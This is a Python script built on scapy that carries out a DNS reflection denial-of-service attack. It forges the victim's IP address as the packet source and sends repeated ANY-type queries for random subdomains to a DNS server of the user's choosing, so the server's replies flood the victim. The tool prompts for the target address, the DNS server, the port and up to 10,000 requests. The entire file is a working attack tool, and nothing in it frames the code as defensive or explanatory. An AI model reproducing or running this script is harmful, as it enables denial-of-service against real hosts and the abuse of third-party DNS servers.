from scapy.all import *
import random
import string
import ipaddress

def random_domain(length):
    letters = string.ascii_letters + string.digits
    random.seed()
    domain = ''.join(random.choice(letters) for _ in range(length))
    return f"{domain}.example.com"

def dns_ddos_attack(target_ip, dns_ip, dns_port, num_requests):
    print(f"\n[*] Starting DNS DDoS attack on {target_ip} using DNS server {dns_ip}...\n")
    for _ in range(num_requests):
        domain = random_domain(random.randint(15, 20))
        dns_request = IP(dst=dns_ip, src=target_ip) / UDP(dport=int(dns_port)) / DNS(rd=1, qd=DNSQR(qname=domain, qtype=255))
        send(dns_request, verbose=0)  

    print(f"\n[*] Sent {num_requests} DNS requests to {target_ip} using DNS server {dns_ip}.\n")

def main():
    try:
        target_ip = input("Enter the target IP address: ").strip()
        dns_ip = input("Enter the DNS server IP address: ").strip()
        dns_port = input("Enter the DNS server port: ").strip() 
        num_requests = int(input("Enter the number of requests to send: ").strip())

        ipaddress.ip_address(target_ip)
        ipaddress.ip_address(dns_ip)

        if not (0 < int(num_requests) <= 10000):
            raise ValueError("Number of requests must be between 1 and 10,000.")

        if not (0 < int(dns_port) <= 65535):
            raise ValueError("DNS port must be between 1 and 65535.")

    except ValueError as e:
        print(f"Error: {e}")
        return


    dns_ddos_attack(target_ip, dns_ip, dns_port, num_requests)

if __name__ == "__main__":
    main()
